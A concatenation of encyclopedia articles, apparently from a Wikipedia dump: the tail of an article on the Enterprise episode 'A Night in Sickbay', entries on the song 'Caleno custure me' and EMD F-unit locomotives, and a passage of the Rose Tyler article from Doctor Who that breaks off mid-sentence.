More than one scene proved problematic for Breezy during the filming of the episode, as the decontamination room set was an enclosed four wall set, meaning that in the scene where Archer rubs down Porthos with decontamination gel, Breezy&#x27;s trainer Scott Rowe couldn&#x27;t be on the set with her. Normally he would have been behind the camera assisting the director by ensuring the dog is looking wherever the scene required. He hoped that with him off the set, that Breezy would look where required and not directly at the camera. In order to prepare for the scene where Porthos leaps out of an immersion tank and into Archer&#x27;s arms, Rowe had a mock-up created so he could practice it with Breezy. He said that &quot;By the time we went into it on that one day to prep on set with Scott, she was jumping out of it into my arms, but I had to make sure that she&#x27;s going to jump out and do it into Scott&#x27;s arms.&quot; In the final scene, not only did Breezy leap into Bakula&#x27;s arms, but she also licked him repeatedly on the face. This wasn&#x27;t due to training, but because they wiped food on Bakula&#x27;s face.

A further challenge for the dog actor was to lie still in an isolation tank and not move even when petted by Bakula or Billingsley during some long scenes whilst on screen. At times a stunt dog was used, but Breezy was required for any close-ups. A Beagle prop was also created for the scenes in the isolation tank and to be submersed in a super-hydration tank. The prop was created by Joel Harlow, who had also created make-up designs for the television series &quot;Carnivàle&quot; and the film &quot;The Chronicles of Riddick&quot;.

==Reception==

&quot;A Night in Sickbay&quot; was first aired in the United States on the UPN on October 16, 2002. It received Nielsen ratings of a 3.9/6 percentage share among all adults, including 6% of all adults watching television at the time of the broadcast. Although overnight figures had shown a slight decrease from the previous episode, the final numbers showed that the ratings were the highest seen so far during season two, and the third week of increased ratings for &quot;Enterprise&quot; in succession. This meant that 6.26 million viewers watched the episode, an increase of 860,000 viewers from the previous week&#x27;s episode, making it the highest viewed episode since season one&#x27;s &quot;Sleeping Dogs&quot;. Alexander Chase at &quot;USA Today&quot; said the numbers &quot;confirm a ratings turnaround for the newest &quot;Trek&quot; series&quot;. The episode placed &quot;Enterprise&quot; fourth in a list of the most highly rated science fiction or fantasy genre shows on television for that week, behind &quot;Alias&quot;, &quot;Smallville&quot; and &quot;John Doe&quot;.

Herc of &quot;Ain&#x27;t It Cool News&quot; rated the episode three out of five, and praised the story about how Porthos was named and the elements of sexual tension between Archer and T&#x27;Pol. He thought the &quot;Odd Couple&quot; type relationship between Archer and Phlox did not work all the time, that there were too many misfires in the comedic elements, and the episode was repeating things that had already &quot;Been seen done.&quot; Michelle Erica Green of TrekNation, said she enjoyed the episode on the whole and enjoyed the characterisation. She criticised the non-moving Beagle prop as it made her son think the dog was dead, which was then followed by &quot;what looks like a drowned dog in formaldehyde&quot;. Jamahl Epsicokhan of &quot;Jammer&#x27;s Reviews&quot; called it &quot;easily the dumbest concept for an episode of &quot;Star Trek&quot; since &quot;Voyager&quot; holodeck was hijacked by the residents of Fair Haven&quot;, and gave it a score of one out of four. He felt that the episode made a mockery out of the characters, and that some of the situations they were placed in were just ridiculous. In his 2022 rewatch, Keith DeCandido of &quot;Tor.com&quot; gave it zero out of ten.
&quot;IGN&quot; called it &quot;The hands-down worst show of the season&quot;.
TechRepublic included the episode on its list of the five worst episodes of &quot;Enterprise&quot;.
&quot;Star Trek: The Complete Manual&quot; published by &quot;SciFiNow&quot; listed it as the third worst episode of the series.
&quot;Screen Rant&quot; ranked &quot;A Night in Sickbay&quot; the 14th worst &quot;Star Trek&quot; episode, highlighting what they felt were poor character development choices and a weak plot that revolved around a sick dog (Porthos) that peed on a tree. 
WhatCulture ranked this episode the 17th worst episode of &quot;Star Trek&quot;.
&quot;The Digital Fix&quot; felt this was a &quot;bad episode&quot;, but noted it for experimenting with format. &quot;Den of Geek&quot; defended the episode, saying it was flawed, but nowhere near as bad as &quot;Spock&#x27;s Brain&quot; or &quot;Threshold&quot;.
In 2016, &quot;SyFy&quot; included this episode in a group of &quot;Star Trek&quot; episodes they felt were commonly disliked, but &quot;deserved a second chance&quot;.

==Awards==
The episode was nominated for the Hugo Award for Best Dramatic Presentation (short form) at the 2003 awards alongside &quot;Carbon Creek&quot; and episodes of &quot;Buffy the Vampire Slayer&quot;, &quot;Angel&quot;, and &quot;Firefly&quot;. The award went to the &quot;Buffy&quot; episode &quot;Conversations with Dead People&quot;.

==Home media==
The first home media release of &quot;A Night in Sickbay&quot; was part of the season two DVD box set, released in the United States on August 7, 2005. The release featured deleted scenes from the episode as well as a special feature on the episode entitled &quot;Inside A Night in Sickbay&quot;. A release on Blu-ray Disc for season two occurred on August 20, 2013.

<text>Caleno custure me (also spelled Calin o custure me) is the title of a song mentioned in Shakespeare&#x27;s Henry V (IV,4). The context is on a Hundred Years&#x27; War battlefield, where an English soldier cannot understand his French captive and intending to answer in similar gibberish pronounces the title of the song.

:&quot;French Soldier&quot;
:Je pense que vous etes gentilhomme de bonne qualite.
:&quot;PISTOL&quot;
:Qualtitie calmie custure me! Art thou a gentleman?
:what is thy name? discuss.
:&quot;French Soldier&quot;
:O Seigneur Dieu!

The song as preserved has English lyrics, with this single line of mock-Latin as its Chorus. The origin of the line is not Latin, however, but is most commonly believed to refer to the Irish-language song Cailín Óg a Stór. It has also been claimed to be from the Irish &quot;Cailín ó Chois tSiúre mé&quot;, &quot;I am a girl from the Suir-side&quot; from the 17th century Irish poem &quot;Mealltar bean le beagán téad&quot;.

<doc id="1341147" wikidata="Q630075" url="?curid=1341147" title="EMD F-unit">
<text>EMD F-units are a line of diesel-electric locomotives produced between November 1939 and November 1960 by General Motors Electro-Motive Division and General Motors-Diesel Division. Final assembly for all F-units was at the GM-EMD plant at La Grange, Illinois, and the GMDD plant in London, Ontario. They were sold to railroads throughout the United States, Canada and Mexico, and a few were exported to Saudi Arabia. The term &quot;F-unit&quot; refers to the model numbers given to each successive type (i.e. F3, F7, etc.), all of which began with the letter &quot;F&quot;. The &quot;F&quot; originally meant &quot;fourteen&quot;, as in , not &quot;freight&quot;. Longer EMD E-units for passenger service had twin diesel engines (called &quot;prime movers&quot; in that type of application). The &quot;E&quot; meant &quot;eighteen&quot; as in . Similarly, for early model EMD switchers, &quot;S&quot; meant &quot;six hundred&quot; and &quot;N&quot; meant &quot;nine hundred horsepower&quot; ( respectively).
F-units were originally designed for freight service, although many without steam generators (for steam-heating passenger cars) pulled short-distance, mainly daytime, passenger trains. Some carriers even equipped small numbers of their Fs with steam generators for long-haul passenger service. On the other hand, Santa Fe maintained a large fleet of fully equipped, high-speed F3s and F7s in &quot;warbonnet&quot; paint schemes built exclusively for top-tier passenger trains, such as the &quot;Chief&quot;, &quot;Super Chief&quot;, and &quot;El Capitan&quot;. Almost all F-units were B-B locomotives, meaning that they ran on two Blomberg B two-axle trucks with all axles powered. The prime mover in F-units was a sixteen-cylinder EMD 567 series mechanically aspirated two-stroke diesel engine, progressing from model 16-567 through 16-567D.

Structurally, the locomotive was a carbody unit, with the body as the main load-bearing structure, designed like a bridge truss and covered with cosmetic panels. The so-called bulldog nose was a distinguishing feature of the locomotive&#x27;s appearance, and made a lasting impression in the mind of the traveling public.

The F-units were the most successful &quot;first generation&quot; road (main line) diesel locomotives in North America, and were largely responsible for superseding steam locomotives in road freight service. Before that, diesel units were mostly built as switcher locomotives, and only used in rail yards.

F-units were sometimes known as &quot;covered wagons&quot;, due to the similarity in appearance of the roof of an F-unit to the canvas roof of a Conestoga wagon, an animal-drawn wagon used in the westward expansion of the United States during the late 18th and 19th centuries. When locomotives on a train included only F-units, the train would then be called a wagon train. Those two usages are still popular with the railfan community.

==Models==
== Model development ==
The FT, introduced in 1939 with the new 567 engine and Blomberg B trucks, was a successful design, and remained in production during WWII.

The F3 (1946) had a different roof arrangement that included the replacement of the FT&#x27;s boxy dynamic brake structure with two under-roof grids, two exhaust stacks instead of four, and four cooling fans grouped together instead of separated pairs of cooling fans. The F3 was also longer than the FT to allow a standard draft gear to be installed at the rear of the unit. The 567B engine was uprated to . Some F3s were nicknamed &quot;chickenwire&quot; for the type of engine room air-intake structure along the sides.

The F7 (1949) and F9 (1954) were evolutionary: the F7 had improved traction motors, the F9 a 567C engine. A louver arrangement over the vents changed their appearance from the F3.

There were also versions, the FP7 and FP9, the extra length being used to house a tank for extra water capacity. Only one F model did not have Blomberg B trucks: the FL9 electro-diesel locomotive had a lightweight Flexicoil B in front and a standard passenger A-1-A at the rear.

Model descriptions are as built, but EMC/EMD locomotives are often rebuilt to newer standards.

==Engine and powertrain==
The F series used a 16-cylinder version of the 567 series diesel engine, introduced in 1939. The 567 was designed specifically for railroad locomotives, a mechanically aspirated 2 stroke 45 degree V type with displacement per cylinder, for a total of . An ongoing engine improvement program saw the FT&#x27;s original up-rated to in the FL9 by the end of F unit production. A DC generator powered four traction motors, two on each truck. The Blomberg B truck first used in the FT became the EMD production standard, being used until 1995. EMC/EMD built all of its major components after 1939

==Passenger service==

While the F-unit series was originally conceived for freight service, many were used to haul passenger trains. The original EMC FT demonstrator was equipped with a steam generator in the B units for train heating. Several railroads took advantage of the large space in the rear of their B units to add steam generators. The first FTs built strictly as a passenger unit was the Santa Fe 167 four unit set in February 1945. Learning from that, EMD offered an optional steam generator on all later F unit models. It was mounted at the rear of the carbody; steam-generator equipped locomotives can be recognised by the exhaust stack and safety valves protruding at the rear of the roof.

The F units were popular passenger locomotives on mountain grades (where they were recommended by EMD), because a four-unit set had more motored axles than a trio of E-units of equivalent power (sixteen versus twelve) and thus had less chance of overloading the traction motors. Additionally, that 4-unit F set had all its weight on driven wheels and was thereby capable of greater tractive effort. The AT&amp;SF &quot;Super Chief&quot;, CB&amp;Q/D&amp;RGW/WP &quot;California Zephyr&quot;, and GN &quot;Empire Builder&quot; all used F units on their Chicago-West Coast routes in the 1950s. The F7 was also popular for commuter lines and other passenger service where the trains were short.

==Options==
There were several options that could be specified by customers, such as type and mounting location of horns and bells.

===Dynamic brakes===
Dynamic brakes were an option on F units ordered by railroads operating in mountainous terrain and with steep grades.

===Passenger or freight pilot===
Either a passenger or freight style pilot could be ordered. The passenger pilot, similar to that standard on EMD E units, slopes smoothly down from the bottom of the nose, making a single slope all the way down from the headlight. The coupler is retractable with concealing doors. The result is a very attractive appearance that enhanced the impression of a powerful and speedy machine.

The freight pilot curves inward a little way below the bottom of the nose before sloping out again, to give more clearance to the coupler and hoses. The coupler is fixed and protrudes through a rectangular opening in the pilot.

<doc id="1341148" wikidata="Q2071982" url="?curid=1341148" title="Rose Tyler">
<text>Rose Tyler is a fictional character in the British science fiction television series &quot;Doctor Who&quot;. She was created by series producer Russell T Davies and portrayed by Billie Piper. With the revival of &quot;Doctor Who&quot; in 2005, Rose was introduced as a new travelling companion of the series protagonist, the Doctor, in his ninth and tenth incarnations. The companion character was key in the first series to introduce new viewers to the mythos of &quot;Doctor Who&quot;, which had not aired regularly since 1989. Rose became the viewers&#x27; eyes into the new world of the series from the companion&#x27;s perspective. Piper received top billing alongside Christopher Eccleston and David Tennant for the duration of her time as a regular cast member. The character was a series regular for all of Series 1 (2005) and 2 (2006). Piper later reprised the role in a supporting capacity in Series 4 (2008) and the New Year&#x27;s special &quot;The End of Time&quot; (2010). Piper further played a sentient weapon called the Moment, which utilises Rose&#x27;s image, in the 50th anniversary special &quot;The Day of the Doctor&quot; (2013).

In the series&#x27; narrative, Rose is introduced in the eponymous series one premiere as a teenage working class shop assistant from London, alongside her own supporting cast in the form of her mother Jackie Tyler (Camille Coduri) and her boyfriend Mickey Smith (Noel Clarke). Over the course of the first series, Rose&#x27;s human actions and responses contrast with the Doctor&#x27;s alien perspectives. Rose grows increasingly trusting of the Doctor and comes to realise she has fallen in love with him. He comes to value and depend on her and sacrifices his Ninth incarnation for her. Rose forms a similar bond with the new Doctor, but the two appear to be forever separated in the series two finale, although Rose&#x27;s temporary return in the fourth series gives her relationship with the Doctor a resolution.

In promoting the series, both Piper and Eccleston stressed Rose&#x27;s heroic characteristics, whilst Davies highlighted her down-to-earth qualities and quintessential &quot;British-ness&quot;. Critical reaction noted that the character was more developed, independent and equal to the Doctor than previous companions had been, whilst the character&#x27;s overall role in the narrative of the first two series was praised. However, the reaction to the character&#x27;s 2008 return was more mixed. Piper won numerous awards for her portrayal of Rose —including two National Television Awards —and since her initial role in the series, the character has ranked highly in numerous &#x27;best companion&#x27; polls. After leaving as a series regular, Piper experienced success in other high-profile roles as an actress, partly attributed to her performances in &quot;Doctor Who&quot;.

==Appearances==
===Television===
Rose is introduced in the eponymous premiere episode, &quot;Rose&quot;, of the 2005 series. She is saved from an Auton attack by the mysterious Time Lord the Doctor (Christopher Eccleston) and assists him in preventing an invasion of Earth. Subsequently, the Doctor invites Rose to be his travelling companion, taking her to the end of the world and tampering her mobile so she can remain in contact with her mother Jackie (Camille Coduri), and boyfriend Mickey Smith (Noel Clarke) while time-travelling in &quot;The End of the World&quot;. In their travels through time and space, Rose learns the importance of not tampering with history, when in &quot;Father&#x27;s Day&quot;, she attempts to save the life of her father Pete Tyler (Shaun Dingwall), who had died when she was a baby. Throughout their journeys, she and the Doctor are haunted by two mysterious recurring words: &quot;Bad Wolf&quot;. Rose, the Doctor, and new companion Captain Jack Harkness (John Barrowman) come to understand the meaning of this phrase in &quot;Bad Wolf&quot; when they encounter an unstoppable army of Daleks on the space station Satellite 5, which first appeared in &quot;The Long Game&quot;. To return to the Doctor after he sends her home to Earth in the series finale &quot;The Parting of the Ways&quot;, Rose tears open the console of the Doctor&#x27;s time machine, the TARDIS, and becomes suffused with the power of the time vortex. Returning, she uses her power over the infinity of time and space to spread the words &quot;Bad Wolf&quot; over its entirety, then saving the universe from the Dalek invasion. Rose resurrects Jack, who was killed by the Daleks, and destroys the Dalek fleet before the Doctor drains the energy out of her to save her life from its harmful effects. Rose is horrified as the Doctor appears to die and regenerates into a new man (David Tennant), who proceeds to take the TARDIS and a terrified Rose to Earth, abandoning Jack on Satellite 5.

The new Doctor and Rose arrive on Earth on Christmas Day, where he passes out from the strain of regeneration in the midst of a Sycorax invasion in the 2005 Christmas special &quot;The Christmas Invasion&quot;. Having woken up and saved Earth, the Doctor enjoys Christmas dinner with Rose before they travel to parts unknown. Over the second series (2006), Rose and the Doctor grow increasingly close to one another. After defeating a werewolf in &quot;Tooth and Claw&quot;, they are knighted by Queen Victoria (Pauline Collins), who banishes them as potential threats to the Empire whilst setting up the Torchwood Institute, which aims to track alien activity on Earth, including the Doctor&#x27;s. Their relationship proves a source of tension once Mickey joins the pair in their travels, at the suggestion of the Doctor&#x27;s former companion Sarah Jane Smith (Elisabeth Sladen) in &quot;School Reunion&quot;. Whilst stranded in a parallel universe in &quot;Rise of the Cybermen&quot;, Rose meets a rich, entrepreneur version of her father Pete who never died. Mickey decides to stay behind on this world to battle Cybermen as he no longer wants to feel like a spare part at the end of &quot;The Age of Steel&quot;. Alone with the Doctor again, Rose faces the Beast (Gabriel Woolf) in the two-part story &quot;The Impossible Planet&quot; and &quot;The Satan Pit&quot;, who prophesies that Rose will soon die in battle. This day comes when, in &quot;Army of Ghosts&quot;, the Torchwood Institute&#x27;s director Yvonne Hartman (Tracy-Ann Oberman) unintentionally allows the Cybermen army and Dalek Cult of Skaro into Rose&#x27;s reality, where they begin a war. In the series finale &quot;Doomsday&quot;, when sealing the Cybermen and Daleks back into the void through which they came, Rose is transported to the parallel universe by Pete, to save her from also being pulled into the void. Rose becomes trapped in the parallel universe with Jackie and the alternate universe Pete as the walls between universes seal; she is subsequently presumed dead in her own universe after disappearing. Months later, the Doctor is able to transmit Rose a goodbye message. She reveals she now works for that universe&#x27;s Torchwood and confesses her love for him. Before he can reply, their connection is lost.

In the spin-off series &quot;Torchwood&quot; (2006–2011), the audience learns that Rose&#x27;s act of resurrecting Jack cursed him with being unable to die. Her absence and the Doctor&#x27;s pained estrangement from her proves a point of contention for the Doctor&#x27;s series 3 (2007) companion Martha Jones (Freema Agyeman); when Martha protects the Doctor, living as a human without his memories, it is still Rose that he dreams of. When the Doctor is reunited with Donna Noble (Catherine Tate) in the show&#x27;s fourth series (2008) during &quot;Partners in Crime&quot;, Rose mysteriously begins to appear in the Doctor&#x27;s life—first seen only by Donna, and later in silent video messages which the Doctor is oblivious to. In &quot;Turn Left&quot;, when a &quot;Time Beetle&quot; creates an alternate universe in which Donna never meets the Doctor and the Doctor dies, Rose travels from her parallel world to this world, working alongside the organisation UNIT to send Donna back in time, and make Donna&#x27;s younger self turn left at a junction and not right. Rose tells Donna to say two words to the Doctor; &quot;Bad Wolf&quot;. The Doctor concludes this is a sign that the universe, and reality itself, is under threat. Later, in the midst of Davros&#x27; (Julian Bleach) plot to obliterate existence, Rose unites with the Doctor and his companions Donna, Martha, Jack and Sarah Jane to make a stand against him and his army of Daleks. In the midst of the battle, a part-human Doctor (the Meta-Crisis Doctor) is created and destroys the Daleks. The Doctor returns Rose to the parallel universe along with Jackie and the Meta-Crisis Doctor. Rose challenges the Doctor to say the words he did not say to her during their previous farewell. The Doctor does not answer, but the Meta-Crisis Doctor whispers the words in her ear, and Rose kisses him. The Doctor retreats, leaving Rose behind to live with the Meta-Crisis Doctor. In the closing scenes of &quot;The End of Time&quot; (2010), just prior to his regeneration, the Doctor travels to Rose&#x27;s housing estate in the first minutes of 2005. He speaks to her from the shadows, asking her what year it is. She tells him it is 1 January 2005. The Doctor promises her that she will have a really great year.

Piper returned for the show&#x27;s 50th-anniversary episode &quot;The Day of the Doctor&quot; (2013) as the interface of a sentient weapon of mass destruction known as &#x27;the Moment&#x27;. The War Doctor (John Hurt) intends to end the raging Time War by using the Moment to destroy both the Daleks and the Time Lords. Using Rose&#x27;s image, chosen for her future significance to the Doctor, the Moment attempts to persuade him to seek an alternative course of action by showing him how the decision will affect his future.

===Literature===
Rose is featured in the first twelve &quot;Doctor Who&quot; New Series Adventures novels, which expand on her characterisation. The first three of these novels—&quot;The Clockwise Man&quot;, &quot;The Monsters Inside&quot; and &quot;Winner Takes All&quot;—were published in May 2005 and feature solely the Ninth Doctor and Rose. &quot;The Monsters Inside&quot; depicts Rose&#x27;s first visit to an alien planet, her travels previously having been confined to Earth and orbiting space stations. Rose mentions this visit to the planet Justicia in the first series television episode &quot;Boom Town&quot;, aired on 4 June 2005. The second batch of Ninth Doctor novels —comprising &quot;The Deviant Strain&quot;, &quot;Only Human&quot; and &quot;The Stealers of Dreams&quot;—were released in September 2005 and expand on the Doctor and Rose&#x27;s travels with Jack Harkness. The novel &quot;Only Human&quot; mentions that Rose was engaged to a previous love interest before becoming involved with Mickey. The events of &quot;Boom Town&quot; are addressed in &quot;The Stealers of Dreams&quot; in which Jackie complains that Rose did not alert her to her recent visit to modern day Cardiff. The first three novels to feature Rose and the Tenth Doctor—&quot;The Stone Rose&quot;, &quot;The Feast of the Drowned&quot; and &quot;The Resurrection Casket&quot;—were released in April 2006 to coincide with the broadcast of the second television series. &quot;The Feast of the Drowned&quot; explores the context of Rose&#x27;s shifting relationship with Jackie and Mickey in light of her frequent absences from Earth. Her relationship with a school friend, Keisha, is also explored; Rose is irritated to find out she and Mickey have become involved in her absence. The last three New Series Adventures novels to feature Rose —&quot;The Nightmare of Black Island&quot;, &quot;The Art of Destruction&quot; and &quot;The Price of Paradise&quot;—were published in September 2006. In addition to the regular range of novels, Rose is featured in the first &quot;Doctor Who&quot; Quick Reads Initiative novella, &quot;I am a Dalek,&quot; in which she and the Doctor must deal with a human-Dalek hybrid.

The &quot;Doctor Who Annual 2006&quot;, published in August 2005, gives further biographical information on Rose in an article written by the programme&#x27;s chief writer and executive producer Russell T Davies, including the middle name &quot;Marion&quot;, and information about her mother, school life and ex-boyfriends. The character also appears in short stories featured in the &quot;Doctor Who&quot; annuals for 2006 and 2007, in addition to an issue of the series&#x27; sanctioned companion magazine, &quot;Doctor Who Magazine&quot;. She has additionally been featured in comic book sequences which feature in the annuals, &quot;Doctor Who Magazine&quot;, and children&#x27;s magazines &quot;Doctor Who Adventures&quot; and &quot;Doctor Who – Battles in Time&quot;. In one &quot;Doctor Who Magazine&quot; comic strip, &quot;The Green-Eyed Monster&quot;, Rose is possessed by a creature that feeds on jealousy. In order to arouse enough jealousy to defeat this creature, the Tenth Doctor feigns a romance with Rose&#x27;s mother, and sets up Mickey with a group of actors who pose as beautiful Amazonian girlfriends. The character also appears in a panel of &quot;Buffy the Vampire Slayer Season Eight&#x27;&quot;s second story, &quot;No Future for You&quot;.

===Audio drama===
Following the folding of AudioGO and Big Finish&#x27;s acquisition of the new series license, Piper reprised her role as Rose in &quot;Doctor Who: The Tenth Doctor Adventures&quot; released in November 2017, with David Tennant reprising his role as the Tenth Doctor. The stories include &quot;Infamy of the Zaross&quot;, &quot;Sword of the Chevalier&quot; and &quot;Cold Vengeance&quot;. Piper returned again for &quot;Rose Tyler: The Dimension Cannon&quot;, a series featuring Rose as the main character travelling through parallel worlds in search of the Doctor.

==Development==
===Casting===
Lead writer and executive producer Russell T Davies chose the name Rose because he considered it a &quot;good luck charm&quot; after he used it for Lesley Sharp&#x27;s character in &quot;Bob &amp; Rose&quot;. His desire to make the show &quot;essentially British&quot; was another justification: he considered Rose to be &quot;the most British name in the world&quot; and feminine enough to subvert a recent trend of female companions having &quot;boyish&quot; names, such as Peri, Benny, Charley, and Ace. Davies also frequently uses the surname &quot;Tyler&quot; in his work —previous characters he created with the surname include Ruth Tyler in &quot;Revelations&quot; (1994), Vince Tyler in &quot;Queer as Folk&quot; (1999), and Johnny Tyler in &quot;The Second Coming&quot; (2003) —due to his affection for how the surname is spelled and pronounced. Davies also used the surname &quot;Tyler&quot; in his &quot;Doctor Who New Adventures&quot; book &quot;Damaged Goods&quot;. The casting of Piper as Rose was announced by the BBC on 24 May 2004. Head of Drama for BBC Wales Julie Gardner commented that the former pop star &quot;fits the bill perfectly&quot; as a &quot;unique, dynamic partner for Christopher Eccleston&quot;. Whilst some fans —including a representative of the Doctor Who Appreciation Society —were enthusiastic about the announcement, others felt it was &quot;publicity stunt&quot; casting and questioned Piper&#x27;s acting credentials. One of the factors that influenced Piper&#x27;s acceptance of the role was that she was able to relate the character of Rose to her own experiences as a teenager.

The British media regularly released conflicting reports about how long Piper would stay with the programme. In March 2006, it was suggested that she would continue on &quot;Doctor Who&quot; into its third series in 2007. However, the BBC announced on 15 June 2006 that Piper was to depart in the final episode of the second series, &quot;Doomsday&quot;. Her decision to leave had been taken a year previously. Following &quot;Doomsday&quot;, Piper as Rose was greenlit to be the star of the spin-off series &quot;Rose Tyler: Earth Defence&quot;, set in her parallel universe and to air as a bank holiday special, but Davies deemed the concept &quot;a spin-off too far&quot; after &quot;Torchwood&quot; and &quot;The Sarah Jane Adventures&quot;. Piper&#x27;s eventual return during series four was planned during filming of the second series; in January 2006, she made a pact promising to return to film several more episodes. Davies and Piper cited her commitment to other projects—specifically, her roles as Belle de Jour in &quot;Secret Diary of a Call Girl&quot;, the lead character in the BBC adaptations of Philip Pullman&#x27;s Sally Lockhart quartet, and Fanny Price in the ITV adaptation of &quot;Mansfield Park&quot;—as explanations behind her departure appearing permanent. Davies&#x27; successor as executive producer, Steven Moffat praised the creation and casting of the character in advance of the series&#x27; 50th anniversary in 2013. He stated that the character of Rose helped secure the return of the show by allowing &quot;an audience who would not naturally have watched &quot;Doctor Who&quot;&quot; to become invested in the show. Moffat suggested that during the first two years of the revival &quot;Doctor Who&quot; &quot;was Billie Piper&#x27;s show&quot; and that this has given her an &quot;iconic status&quot; above other &quot;Doctor Who&quot; companions.

===Characterisation===
Davies uses Rose as an introduction to the show&#x27;s mythos and fantasy elements. He later underlined similarities between Rose and Gwen Cooper —the lead for &quot;Torchwood&quot; — describing both as &quot;the ordinary person who stumbles into something extraordinary and finds herself their equal.&quot; Like her successor Martha, Rose is from London; Brett Mills from the University of East Anglia makes the assumption that this is because characters from the capital of the country are &quot;relatable to all British people&quot; because they are seen as &quot;neutral&quot;. Rose is introduced alongside a supporting cast in the form of her boyfriend Mickey and mother Jackie which James Chapman cites as &quot;evidence of Davies&#x27; attempt to create a social context for the companion&quot;. Davies states that the inclusion of these two characters was part of his desire to &quot;make her real&quot; and to &quot;give her a life&quot;. He later stated that in giving Rose a mother, a boyfriend and a &quot;sad story with her father&quot; the character has &quot;her own mythology, to match the Doctor.&quot; Lindy A. Orthia observes that Rose, like the other companions in Davies&#x27;s era of &quot;Doctor Who&quot;, is &quot;drawn from a cosmopolitan vision&quot; in her case because of her class background. Orthia contends that whilst working-class companions had featured previously in the show &quot;none were unskilled workers nor chronically under- or unemployed like Rose, Jackie and Donna&quot;. Looking back at the two characters, Davies felt Jackie to be someone who is &quot;holding Rose back&quot; right from the first episode due to her suggestions her daughter be content with menial employment. Piper states that this causes Rose to resent her mum somewhat, although she loves her.
Kay McFadden of &quot;The Seattle Times&quot; felt Rose to resemble &quot;the Bridget Jones type of Englishwoman, albeit a few pegs down the socioeconomic scale&quot; waiting to be awakened &quot;not by some Mark Darcy ...  but by adventure incarnate.&quot; Piper stated that at the start of the series Rose is &quot;looking for something to happen&quot; and that once the Doctor arrives she becomes &quot;ruthless&quot; in her decision to &quot;completely drop her life as she knows it.&quot; At a media preview of the series she characterised Rose as being &quot;positive, ambitious and full of conviction and confidence.&quot; She also felt that Rose is &quot;a good character to relate to or aspire to.&quot; In a 2013 retrospective on her time on &quot;Doctor Who&quot; Piper stated Rose&#x27;s feminine characteristics contributed to her being a balanced representation of a female character. She felt that Rose as a character could be both &quot;strong-willed and vulnerable&quot; and ventured that her emotional response made her more interesting than &quot;a female character endlessly striving towards perfection&quot;. Eccleston, who played the Ninth Doctor described the character as a &quot;heroine&quot; who &quot;teaches [the Doctor] huge emotional lessons&quot;. In an episode of &quot;Doctor Who Confidential&quot; he expanded on this, describing her as &quot;the Doctor&#x27;s equal in every way&quot; except for the fact she lacks his scientific knowledge. He felt that the relationship between the two characters was &quot;love at first sight&quot; although in a more mysterious fashion than a conventional love affair. Davies summarised the relationship between the two characters as &quot;soul mates&quot; who &quot;understand and complement each other&quot;.

Lynette Porter, in her book &quot;Tarnished Heroes, Charming Villains and Modern Monsters: Science Fiction in Shades of Gray on 21st Century Television&quot; observed that Rose&#x27;s role &quot;humanises the Doctor and makes him less alien, not only to other characters, but to the audience&quot;. In the first series finale, Rose takes on deadly energies to save the Doctor and planet Earth. Script editor Helen Raynor felt the episode gave Rose a chance to &quot;again be the Doctor&#x27;s equal&quot; and &quot;to finally match him with a gesture that is so noble, and strong, and heroic, and clever&quot;. Davies describes Rose in the context of this scene and the whole of the first series as being &quot;braver than brave and more loyal than anyone else in the universe&quot;. The Doctor repays her loyalty by sacrificing his ninth incarnation in turn to save her; Davies states unequivocally that &quot;he gives his life for her&quot;. Elements of Rose&#x27;s characterisation in the first series were originally different. Paul Abbott was scheduled to write an episode which would have revealed that the Doctor manipulated Rose&#x27;s entire life to mould her into an ideal companion. Davies wrote the episode &quot;Boom Town&quot; to replace it when Abbott realised he was too busy to work on the script.

===With the Tenth Doctor===

In an interview with &quot;SFX&quot; producer Phil Collinson stated that after the Doctor regenerates the &quot;initial dynamic changes because [Rose] has to learn to trust him again&quot;. Piper added that as the Doctor is incapacitated Rose consequently feels &quot;unloved&quot;, &quot;isolated&quot; and &quot;like she&#x27;s lost her best friend&quot;. Rose relies on her observations of the Doctor in his absence and tries to mimic his actions. Collinson felt it was important to resolve any mistrust between the pair by the end of the Christmas Special, as the public had responded well to Rose and the Doctor&#x27;s friendship previously. Davies had scripted dialogue in &quot;The Christmas Invasion&quot; explaining the newly regenerated Doctor&#x27;s estuary English accent by stating he had imprinted on Rose and adopted her way of speaking. However, due to time constraints, this sequence was not filmed. Discussing how Rose had developed by the second series, Piper described her as having &quot;come on in leaps and bounds&quot; and stated she is now &quot;a lot more proactive.&quot; She felt that there is a &quot;different kind of energy&quot; between Rose and the Tenth Doctor, whilst Tennant remarked that the audience would get to see the Doctor-companion relationship &quot;developing and becoming something that it maybe hasn&#x27;t before.&quot; Piper stated that with the Tenth Doctor, Rose is &quot;more tetchy and more possessive&quot; over him as &quot;she feels like she&#x27;s lost him once and doesn&#x27;t want to lose him again&quot;. She cited Rose&#x27;s &quot;catfight&quot; with former companion Sarah Jane Smith in &quot;School Reunion&quot; as evidence of this. Discussing the possibility of Rose and the Tenth Doctor becoming more romantically involved Piper stated &quot;You want it to happen, but at the same time you don&#x27;t want it to happen&quot;. Tennant likened the dynamic between the pair to that of Dana Scully (Gillian Anderson) and Fox Mulder (David Duchovny) in &quot;The X-Files&quot;. Both Tennant and Piper agreed that the expectation of the relationship is more exciting than having it realised. To add to the tragedy of their separation, Davies scripted the series two story arc so that Rose and the Doctor would be indirectly responsible for their separation. &quot;It&#x27;s deliberate when that happens [the Doctor and Rose&#x27;s arrogance]&quot;, said Davies, &quot;and they do pay the price. In &quot;Tooth and Claw&quot;, they set up the very thing — Torchwood — that separates them in the end. It&#x27;s sort of their own fault.&quot; Though Davies left the Doctor&#x27;s response to Rose&#x27;s declaration of love in &quot;Doomsday&quot; unstated, Gardner felt strongly that the character reciprocated her feelings. On the commentary for the episode, she stated that she would &quot;confirm to the world&quot; that he was going to &quot;say it back.&quot;

Davies created the expectation of Rose&#x27;s return in the fourth series by mentioning her in dialogue and featuring Piper in cameo appearances in &quot;Partners in Crime&quot;, &quot;The Poison Sky&quot;, and &quot;Midnight&quot;. Speaking on how Rose&#x27;s character had changed between her appearances, Davies described the fourth series Rose as &quot;tougher, more independent, and [she] might, at times, seem a little harder&quot;. Piper stated she rewatched her earlier episodes to remember how the character spoke and acted as she felt she had &quot;been playing posh birds&quot; since she left the programme and by contrast &quot;Rose is a bit of a chav&quot;. Rose is re-united with the Doctor near the climax of &quot;The Stolen Earth&quot;. Director Graeme Harper insisted that the scene appear &quot;mystical&quot; because the characters&#x27; reunion was &quot;the most magical moment&quot; in the entire episode and Ernie Vincze, the Director of Photography for the show, compared the scene&#x27;s feeling to the 1980s science-fiction film &quot;Blade Runner&quot;. Davies characterised the reunion between Rose and the Doctor as &quot;the biggest romance [the viewer] has ever seen&quot; and joked that seminal films such as &quot;Gone with the Wind&quot; should have ended with a 